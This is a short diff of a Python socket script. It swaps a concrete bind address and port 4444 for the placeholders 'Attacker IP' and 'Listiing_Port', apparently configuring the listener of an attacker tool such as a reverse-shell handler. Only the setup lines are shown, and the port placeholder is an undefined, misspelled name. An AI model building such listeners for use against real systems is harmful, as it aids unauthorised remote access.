@@ -1,8 +1,8 @@
 import socket
 
 # Set the IP and port to listen on
-bind_ip = '192.168.1.5'
-bind_port = 4444
+bind_ip = 'Attacker IP'
+bind_port = Listiing_Port
 
 # Create a socket and bind it to the specified IP and port
 s = socket.socket()
